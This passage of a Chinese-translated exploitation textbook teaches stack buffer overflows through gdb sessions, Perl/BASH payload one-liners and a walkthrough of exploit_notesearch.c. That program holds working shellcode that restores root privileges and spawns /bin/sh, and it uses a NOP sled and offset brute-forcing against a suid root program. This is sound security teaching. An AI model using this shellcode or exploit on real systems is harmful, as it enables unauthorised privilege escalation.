0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
(gdb) x/32xb 0xbffff9b7
0xbffff9b7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff9bf:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff9c7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff9cf:     0x41    0x41    0x41    0x41    0x41    0x41    0x00    0x53
(gdb) x/s 0xbffff9b7
0xbffff9b7:      'A' <repeats 30 times> 
(gdb)
```

通过理解栈帧是如何创建的，可以定位栈帧中的返回地址。这个过程从`main()`函数开始，甚至在函数调用之前。

```
(gdb) disass main
Dump of assembler code for function main:
0x08048474 <main+0>:    push   ebp
0x08048475 <main+1>:    mov    ebp,esp
0x08048477 <main+3>:    sub    esp,0x8
0x0804847a <main+6>:    and    esp,0xfffffff0
0x0804847d <main+9>:    mov    eax,0x0
0x08048482 <main+14>:   sub    esp,eax
0x08048484 <main+16>:   cmp    DWORD PTR [ebp+8],0x1
0x08048488 <main+20>:   jg     0x80484ab <main+55>
0x0804848a <main+22>:   mov    eax,DWORD PTR [ebp+12]
0x0804848d <main+25>:   mov    eax,DWORD PTR [eax]
0x0804848f <main+27>:   mov    DWORD PTR [esp+4],eax
0x08048493 <main+31>:   mov    DWORD PTR [esp],0x80485e5
0x0804849a <main+38>:   call   0x804831c <printf@plt>
0x0804849f <main+43>:   mov    DWORD PTR [esp],0x0
0x080484a6 <main+50>:   call   0x804833c <exit@plt>
0x080484ab <main+55>:   mov    eax,DWORD PTR [ebp+12]
0x080484ae <main+58>:   add    eax,0x4
0x080484b1 <main+61>:   mov    eax,DWORD PTR [eax]
`0x080484b3 <main+63>:   mov    DWORD PTR [esp],eax 0x080484b6 <main+66>:   call   0x8048414 <check_authentication>`
0x080484bb <main+71>:   test   eax,eax
0x080484bd <main+73>:   je     0x80484e5 <main+113>
0x080484bf <main+75>:   mov    DWORD PTR [esp],0x80485fb
0x080484c6 <main+82>:   call   0x804831c <printf@plt>
0x080484cb <main+87>:   mov    DWORD PTR [esp],0x8048619
0x080484d2 <main+94>:   call   0x804831c <printf@plt>
0x080484d7 <main+99>:   mov    DWORD PTR [esp],0x8048630
0x080484de <main+106>:  call   0x804831c <printf@plt>
0x080484e3 <main+111>:  jmp    0x80484f1 <main+125>
0x080484e5 <main+113>:  mov    DWORD PTR [esp],0x804864d
0x080484ec <main+120>:  call   0x804831c <printf@plt>
0x080484f1 <main+125>:  leave
0x080484f2 <main+126>:  ret
End of assembler dump.
(gdb)
```

注意第 131 页上用粗体显示的两行。此时，EAX 寄存器包含第一个命令行参数的指针。这也是`check_authentication()`函数的参数。第一条汇编指令将 EAX 写入 ESP 所指向的位置（栈顶）。这为`check_authentication()`函数的函数参数开始了栈帧。第二条指令是实际的调用指令。这条指令将下一条指令的地址压入栈中，并将执行指针寄存器（EIP）移动到`check_authentication()`函数的开始处。压入栈中的地址是栈帧的返回地址。在这种情况下，下一条指令的地址是`0x080484bb`，因此这就是返回地址。

```
(gdb) disass check_authentication
Dump of assembler code for function check_authentication:
`0x08048414 <check_authentication+0>:    push   ebp 0x08048415 <check_authentication+1>:    mov    ebp,esp 0x08048417 <check_authentication+3>:    sub    esp,0x38`

...

0x08048472 <check_authentication+94>:   leave
0x08048473 <check_authentication+95>:   ret
End of assembler dump.
(gdb) p 0x38
$3 = 56
(gdb) p 0x38 + 4 + 4
$4 = 64
(gdb)
```

当 EIP 改变时，执行将继续进入`check_authentication()`函数，并且上面用粗体显示的前几条指令完成了栈帧内存的保存。这些指令被称为函数序言。前两条指令用于保存帧指针，第三条指令从 ESP 中减去`0x38`。这为函数的局部变量保存了 56 个字节。返回地址和保存的帧指针已经压入栈中，并占用了 64 字节栈帧中的额外 8 个字节。

当函数结束时，`leave`和`ret`指令移除栈帧，并将执行指针寄存器（EIP）设置为栈帧中保存的返回地址（![httpatomoreillycomsourcenostarchimages254488.png](img/httpatomoreillycomsourcenostarchimages254488.png)）。这使程序执行回到`main()`函数中`0x080484bb`函数调用之后的下一条指令。这个过程在程序中的任何函数调用时都会发生。

```
(gdb) x/32xw $esp
0xbffff7a0:     0x00000000      `0x08049744      0xbffff7b8      0x080482d9`
0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000`
0xbffff7c0:     `0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4`
0xbffff7d0:     `0xb7ff47b0      0x08048510      0xbffff7e8   ![](img/httpatomoreillycomsourcenostarchimages254488.png)0x080484bb`
0xbffff7e0:     `0xbffff9b7`      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
(gdb) cont
Continuing.

Breakpoint 3, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)
    at auth_overflow2.c:16
16              return auth_flag;
(gdb) x/32xw $esp
0xbffff7a0:     `0xbffff7c0      0x080485dc      0xbffff7b8      0x080482d9`
0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000`
0xbffff7c0:     `0x41414141      0x41414141      0x41414141      0x41414141`
0xbffff7d0:     `0x41414141      0x41414141      0x41414141   ![](img/httpatomoreillycomsourcenostarchimages254530.png)0x08004141`
0xbffff7e0:     `0xbffff9b7`      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
(gdb) cont
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
(gdb)
```

当保存的返回地址的一些字节被覆盖时，程序仍然会尝试使用该值来恢复执行指针寄存器（EIP）。这通常会导致崩溃，因为执行实际上是在跳转到随机位置。但这个值不一定是随机的。如果覆盖是受控制的，执行可以反过来被控制以跳转到特定位置。但我们应该告诉它去哪里？

# 尝试使用 BASH

由于黑客技术很大程度上根植于利用和实验，快速尝试不同事情的能力至关重要。BASH 壳和 Perl 在大多数机器上都很常见，并且是进行利用实验所需的一切。

*Perl* 是一种解释型编程语言，它有一个 `print` 命令，这个命令恰好非常适合生成长序列的字符。Perl 可以通过使用 `-e` 开关在命令行上执行指令，如下所示：

```
reader@hacking:~/booksrc $ perl -e 'print "A" x 20;'
AAAAAAAAAAAAAAAAAAAA
```

这个命令告诉 Perl 执行单引号之间的命令——在这种情况下，一个命令 `print "A" x 20;`。这个命令打印字符 *A* 20 次。

任何字符，例如不可打印字符，也可以通过使用 `\x##` 来打印，其中 ## 是字符的十六进制值。在下面的例子中，这种表示法用于打印字符 *A*，其十六进制值为 `0x41`。

```
reader@hacking:~/booksrc $ perl -e 'print "\x41" x 20;'
AAAAAAAAAAAAAAAAAAAA
```

此外，Perl 中可以使用点号 (.) 进行字符串连接。这在将多个地址连接起来时可能很有用。

```
reader@hacking:~/booksrc $ perl -e 'print "A"x20 . "BCD" . "\x61\x66\x67\x69"x2 . "Z";'
AAAAAAAAAAAAAAAAAAAABCDafgiafgiZ
```

可以像函数一样执行整个 shell 命令，并返回其输出。这是通过将命令用括号括起来并在前面加美元符号来完成的。以下有两个例子：

```
reader@hacking:~/booksrc $ $(perl -e 'print "uname";')
Linux
reader@hacking:~/booksrc $ una$(perl -e 'print "m";')e
Linux
reader@hacking:~/booksrc $
```

在每种情况下，括号中找到的命令的输出被替换为命令，并执行 `uname` 命令。这个精确的命令替换效果可以通过重音符号（', tilde 键上的倾斜单引号）来实现。你可以使用对你来说更自然的语法；然而，括号语法对大多数人来说更容易阅读。

```
reader@hacking:~/booksrc $ u`perl -e 'print "na";'`me
Linux
reader@hacking:~/booksrc $ u$(perl -e 'print "na";')me
Linux
reader@hacking:~/booksrc $
```

可以结合使用命令替换和 Perl 来快速生成动态的溢出缓冲区。你可以使用这种技术轻松地测试具有精确长度的缓冲区的 overflow_example.c 程序。

```
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x30')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 30 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
reader@hacking:~/booksrc $ gdb -q
(gdb) print 0xbffff7f4 - 0xbffff7e0
$1 = 20

(gdb) quit
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 . "ABCD"')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 24 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'
[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241) 
reader@hacking:~/booksrc $
```

在上面的输出中，GDB 被用作十六进制计算器来计算 `buffer_two (0xbfffff7e0)` 和 `value` 变量 (`0xbffff7f4`) 之间的距离，结果为 20 字节。使用这个距离，`value` 变量被覆盖为确切的值 `0x44434241`，因为字符 *A, B, C* 和 *D* 的十六进制值分别为 `0x41, 0x42, 0x43` 和 `0x44`。第一个字符是最不显著的字节，因为是小端架构。这意味着如果你想要用确切的东西控制 `value` 变量，比如 `oxdeadbeef`，你必须以相反的顺序将这些字节写入内存。

```
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 .
 "\xef\xbe\xad\xde"')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 24 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'
[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)
reader@hacking:~/booksrc $
```

这种技术可以应用于用确切值覆盖 auth_overflow2.c 程序中的返回地址。在下面的例子中，我们将覆盖`main()`中的不同地址的返回地址。

```
reader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c 
reader@hacking:~/booksrc $ gdb -q ./auth_overflow2
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) disass main
Dump of assembler code for function main:
0x08048474 <main+0>:    push   ebp
0x08048475 <main+1>:    mov    ebp,esp
0x08048477 <main+3>:    sub    esp,0x8
0x0804847a <main+6>:    and    esp,0xfffffff0
0x0804847d <main+9>:    mov    eax,0x0
0x08048482 <main+14>:   sub    esp,eax
0x08048484 <main+16>:   cmp    DWORD PTR [ebp+8],0x1
0x08048488 <main+20>:   jg     0x80484ab <main+55>
0x0804848a <main+22>:   mov    eax,DWORD PTR [ebp+12]
0x0804848d <main+25>:   mov    eax,DWORD PTR [eax]
0x0804848f <main+27>:   mov    DWORD PTR [esp+4],eax
0x08048493 <main+31>:   mov    DWORD PTR [esp],0x80485e5
0x0804849a <main+38>:   call   0x804831c <printf@plt>
0x0804849f <main+43>:   mov    DWORD PTR [esp],0x0
0x080484a6 <main+50>:   call   0x804833c <exit@plt>
0x080484ab <main+55>:   mov    eax,DWORD PTR [ebp+12]
0x080484ae <main+58>:   add    eax,0x4
0x080484b1 <main+61>:   mov    eax,DWORD PTR [eax]
0x080484b3 <main+63>:   mov    DWORD PTR [esp],eax
0x080484b6 <main+66>:   call   0x8048414 <check_authentication>
0x080484bb <main+71>:   test   eax,eax
0x080484bd <main+73>:   je     0x80484e5 <main+113>
`0x080484bf <main+75>:   mov    DWORD PTR [esp],0x80485fb 0x080484c6 <main+82>:   call   0x804831c <printf@plt> 0x080484cb <main+87>:   mov    DWORD PTR [esp],0x8048619 0x080484d2 <main+94>:   call   0x804831c <printf@plt> 0x080484d7 <main+99>:   mov    DWORD PTR [esp],0x8048630 0x080484de <main+106>:  call   0x804831c <printf@plt>`
0x080484e3 <main+111>:  jmp    0x80484f1 <main+125>
0x080484e5 <main+113>:  mov    DWORD PTR [esp],0x804864d
0x080484ec <main+120>:  call   0x804831c <printf@plt>
0x080484f1 <main+125>:  leave
0x080484f2 <main+126>:  ret
End of assembler dump.
(gdb)
```

在粗体显示的这段代码中，包含了显示“*访问已允许*”信息的指令。该部分的起始地址为`0x080484bf`，因此如果返回地址被覆盖为这个值，这段指令就会被执行。由于不同的编译器版本和不同的优化标志，返回地址与`password_buffer`起始地址之间的确切距离可能会变化。只要缓冲区的起始地址与堆栈上的 DWORD 对齐，这种可变性可以通过简单地多次重复返回地址来解释。这样，至少有一个实例会覆盖返回地址，即使它由于编译器优化而发生了偏移。

```
reader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e 'print "\xbf\x84\x04\x08"x10')

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Segmentation fault (core dumped)
reader@hacking:~/booksrc $
```

在上面的例子中，将`0x080484bf`的目标地址重复了 10 次，以确保返回地址被新的目标地址覆盖。当`check_authentication()`函数返回时，执行会直接跳转到新的目标地址，而不是返回到调用之后的下一个指令。这给了我们更多的控制权；然而，我们仍然局限于使用原始编程中存在的指令。

notesearch 程序在粗体标记的这一行上容易受到缓冲区溢出的影响。

```
int main(int argc, char *argv[]) {
   int userid, printing=1, fd; // File descriptor
   char searchstring[100];

   if(argc > 1)                        // If there is an arg
      `strcpy(searchstring, argv[1]);`   //   that is the search string;
   else                                // otherwise,
      searchstring[0] = 0;             //   search string is empty.
```

notesearch 漏洞利用采用了类似的技巧来溢出缓冲区到返回地址；然而，它还会将自身的指令注入到内存中，然后从那里返回执行。这些指令被称为*shellcode*，它们指示程序恢复权限并打开一个 shell 提示符。这对于 notesearch 程序来说尤其致命，因为它具有 suid root 权限。由于这个程序期望多用户访问，它以更高的权限运行，以便访问其数据文件，但程序逻辑阻止用户使用这些更高的权限进行除访问数据文件之外的其他操作——至少这是预期意图。

但是，当可以注入新指令并且可以通过缓冲区溢出来控制执行时，程序逻辑就变得无关紧要了。这种技术允许程序执行它从未被编程去执行的事情，同时它仍然以提升的权限运行。这是 notesearch 漏洞利用能够获得 root shell 的危险组合。让我们进一步研究这个漏洞利用。

```
reader@hacking:~/booksrc $ gcc -g exploit_notesearch.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4       char shellcode[]=
5       "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
6       "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
7       "\xe1\xcd\x80";
8
9       int main(int argc, char *argv[]) {
10         unsigned int i, *ptr, ret, offset=270;
(gdb)
11         char *command, *buffer;
12
13         command = (char *) malloc(200);
14         bzero(command, 200); // Zero out the new memory.
15
16         strcpy(command, "./notesearch \'"); // Start command buffer.
17         buffer = command + strlen(command); // Set buffer at the end.
18
19         if(argc > 1) // Set offset.
20            offset = a toi(argv[1]);
(gdb)
21
22         ret = (unsigned int) &i - offset; // Set return address.
23
`24         for(i=0; i < 160; i+=4)` // Fill buffer with return address.
`25            *((unsigned int *)(buffer+i)) = ret; 26         memset(buffer, 0x90, 60);`  // Build NOP sled.
`27         memcpy(buffer+60, shellcode, sizeof(shellcode)-1);`
28
29         strcat(command, "\'");
30
(gdb) break 26
Breakpoint 1 at 0x80485fa: file exploit_notesearch.c, line 26.
(gdb) break 27
Breakpoint 2 at 0x8048615: file exploit_notesearch.c, line 27.
(gdb) break 28
Breakpoint 3 at 0x8048633: file exploit_notesearch.c, line 28.
(gdb)
```

notesearch 漏洞利用在 24 到 27 行（如上粗体所示）生成一个缓冲区。第一部分是一个 for 循环，它使用存储在`ret`变量中的 4 字节地址填充缓冲区。每次循环，`i`增加 4。这个值被加到缓冲区地址上，整个内容被转换为无符号整数指针。这个大小为 4，所以当整个内容被解引用时，`ret`中找到的整个 4 字节值将被写入。

```
(gdb) run
Starting program: /home/reader/booksrc/a.out

Breakpoint 1, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:26
26         memset(buffer, 0x90, 60); // build NOP sled
(gdb) x/40x buffer
0x804a016:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a026:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a036:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a046:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
(gdb) x/s command
0x804a008:       "./notesearch
'¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶û
ÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
(gdb)
```

在第一个断点处，缓冲区指针显示了 for 循环的结果。你还可以看到命令指针和缓冲区指针之间的关系。下一条指令是调用`memset()`，它从缓冲区的开始处开始，将 60 个字节的内存设置为值`0x90`。

```
(gdb) cont
Continuing.

Breakpoint 2, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:27
27         memcpy(buffer+60, shellcode, sizeof(shellcode)-1); 
(gdb) x/40x buffer
0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a046:      0x90909090      0x90909090      0x90909090      0xbffff6f6
0x804a056:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a066:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
(gdb) x/s command 
0x804a008:       "./notesearch '", '\220' <repeats 60 times>, "¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿
¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
(gdb)
```

最后，`memcpy()`的调用将 shellcode 字节复制到`buffer+60`。

```
(gdb) cont
Continuing.

Breakpoint 3, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:29
29         strcat(command, "\'");
(gdb) x/40x buffer
0x804a016:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a026:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a036:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a046:      0x90909090      0x90909090      0x90909090      0x3158466a
0x804a056:      0xcdc931db      0x2f685180      0x6868732f      0x6e69622f
0x804a066:      0x5351e389      0xb099e189      0xbf80cd0b      0xbffff6f6
0x804a076:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a086:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a096:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
0x804a0a6:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6
(gdb) x/s command
0x804a008:       "./notesearch '", '\220' <repeats 60 times>, "1À1Û1É\231°gÍ\200j\vXQh//shh/
bin\211ãQ\211âS\211áÍ\200¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
(gdb)
```

现在缓冲区包含所需的 shellcode，并且足够长，可以覆盖返回地址。通过使用重复的返回地址技术，找到返回地址的确切位置变得容易。但是，这个返回地址必须指向同一缓冲区中位于 shellcode 的位置。这意味着实际的地址必须在它进入内存之前就预先知道。在动态变化的堆栈上尝试做出这样的预测可能很困难。幸运的是，还有一种称为 NOP 滑梯的黑客技术，可以帮助完成这项困难的诡计。"NOP"是一种汇编指令，代表"无操作"。它是一个单字节指令，什么都不做。这些指令有时用于浪费计算周期以达到定时目的，在 Sparc 处理器架构中，由于指令流水线，这些指令实际上是必要的。在这种情况下，NOP 指令将被用于不同的目的：作为调整因素。我们将创建一个由这些 NOP 指令组成的大数组（或滑梯），并将其放置在 shellcode 之前；然后，如果 EIP 寄存器指向 NOP 滑梯中找到的任何地址，它将在执行每个 NOP 指令时逐个递增，直到最终到达 shellcode。这意味着只要返回地址被覆盖为 NOP 滑梯中找到的任何地址，EIP 寄存器就会沿着滑梯滑到 shellcode，并正确执行。在*x*86 架构上，NOP 指令相当于十六进制字节 0x90。这意味着我们的完成后的漏洞缓冲区看起来可能像这样：

![图片](img/httpatomoreillycomsourcenostarchimages254213.png.jpg)

图 0x300-2。

即使有 NOP 滑梯，也必须在事先预测内存中缓冲区的近似位置。一种近似内存位置的技术是使用附近的堆栈位置作为参考框架。通过从这个位置减去一个偏移量，可以获取任何变量的相对地址。

## 在 BASH 中进行实验

### 从 exploit_notesearch.c

```
  unsigned int i, *ptr, ret, offset=270;
  char *command, *buffer;

  command = (char *) malloc(200);
  bzero(command, 200); // Zero out the new memory.

  strcpy(command, "./notesearch \'"); // Start command buffer.
  buffer = command + strlen(command); // Set buffer at the end.

  if(argc > 1) // Set offset.
    offset = atoi(argv[1]);

  ret = (unsigned int) &i - offset; // Set return address.
```

在 notesearch 漏洞利用中，`main()`堆栈帧中变量`i`的地址被用作参考点。然后从这个值中减去一个偏移量；结果是目标返回地址。这个偏移量之前被确定为 270，但这个数字是如何计算的呢？

确定这个偏移量最简单的方法是进行实验。调试器会稍微移动内存，并在执行 suid root notesearch 程序时降级权限，这使得在这种情况下调试变得非常无用。

由于 notesearch 漏洞利用允许通过命令行参数定义偏移量，因此可以快速测试不同的偏移量。

```
reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out 100
-------[ end of note data ]-------
reader@hacking:~/booksrc $ ./a.out 200
-------[ end of note data ]-------
reader@hacking:~/booksrc $
```

然而，手动做这件事既繁琐又愚蠢。BASH 还有一个 for 循环可以用来自动化这个过程。`seq`命令是一个简单的程序，用于生成数字序列，通常与循环一起使用。

```
reader@hacking:~/booksrc $ seq 1 10
1
2
3
4
5
6
7
8
9
10
reader@hacking:~/booksrc $ seq 1 3 10
1
4
7
10
reader@hacking:~/booksrc $
```

当只使用两个参数时，会生成从第一个参数到第二个参数的所有数字。当使用三个参数时，中间的参数决定了每次增加的量。这可以与命令替换一起使用，以驱动 BASH 的 for 循环。

```
reader@hacking:~/booksrc $ for i in $(seq 1 3 10)
> do
> echo The value is $i
> done
The value is 1
The value is 4
The value is 7
The value is 10
reader@hacking:~/booksrc $
```

for 循环的功能应该很熟悉，即使语法略有不同。shell 变量`$i`遍历由`seq`生成的所有值。然后，在`do`和`done`关键字之间执行所有内容。这可以用来快速测试许多不同的偏移量。由于 NOP sled 长度为 60 字节，并且我们可以在 sled 上的任何位置返回，因此大约有 60 字节的调整空间。我们可以安全地以 30 为步长递增偏移量循环，而不用担心错过 sled。

```
reader@hacking:~/booksrc $ for i in $(seq 0 30 300)
> do
> echo Trying offset $i
> ./a.out $i
> done
Trying offset 0
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
```

当使用正确的偏移量时，返回地址会被覆盖为一个指向 NOP sled 上某个位置的值。当执行尝试返回到该位置时，它将滑入注入的 shellcode 指令。这就是默认偏移量值被发现的方式。

## 使用环境变量

有时缓冲区可能太小，甚至无法容纳 shellcode。幸运的是，内存中还有其他位置可以存放 shellcode。环境变量被用户 shell 用于各种目的，但它们被用于什么目的并不重要，重要的是它们位于栈上，并且可以从 shell 中设置。下面的示例将名为`MYVAR`的环境变量设置为字符串*test*。可以通过在其名称前加美元符号来访问这个环境变量。此外，`env`命令将显示所有环境变量。注意，已经设置了一些默认环境变量。

```
reader@hacking:~/booksrc $ export MYVAR=test
reader@hacking:~/booksrc $ echo $MYVAR
test
reader@hacking:~/booksrc $ env
SSH_AGENT_PID=7531
SHELL=/bin/bash
DESKTOP_STARTUP_ID=
TERM=xterm
GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2
WINDOWID=39845969
OLDPWD=/home/reader
USER=reader
LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;
01:or=4
0;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:
*.arj=01;
31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:
*.deb=01;31:*
.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:
*.pgm=01;35
:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:
*.mov=01;
35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:
*.xwd=01;
35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:
SSH_AUTH_SOCK=/tmp/ssh-EpSEbS7489/agent.7489
GNOME_KEYRING_SOCKET=/tmp/keyring-AyzuEi/socket
SESSION_MANAGER=local/hacking:/tmp/.ICE-unix/7489
USERNAME=reader
DESKTOP_SESSION=default.desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
GDM_XSERVER_LOCATION=local
PWD=/home/reader/booksrc
LANG=en_US.UTF-8
GDMSESSION=default.desktop
HISTCONTROL=ignoreboth
HOME=/home/reader
SHLVL=1
GNOME_DESKTOP_SESSION_ID=Default
LOGNAME=reader
DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-
DxW6W1OH1O,guid=4f4e0e9cc6f68009a059740046e28e35
LESSOPEN=| /usr/bin/lesspipe %s
DISPLAY=:0.0
`MYVAR=test`
LESSCLOSE=/usr/bin/lesspipe %s %s
RUNNING_UNDER_GDM=yes
COLORTERM=gnome-terminal
XAUTHORITY=/home/reader/.Xauthority
_=/usr/bin/env
reader@hacking:~/booksrc $
```

同样，shellcode 可以放入环境变量中，但首先它需要是我们容易操作的形式。notesearch 漏洞中的 shellcode 可以用来；我们只需要将其放入一个二进制格式的文件中。标准的 shell 工具`head`、`grep`和`cut`可以用来隔离 shellcode 的十六进制展开字节。

```
reader@hacking:~/booksrc $ head exploit_notesearch.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
reader@hacking:~/booksrc $ head exploit_notesearch.c | grep "^\""
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
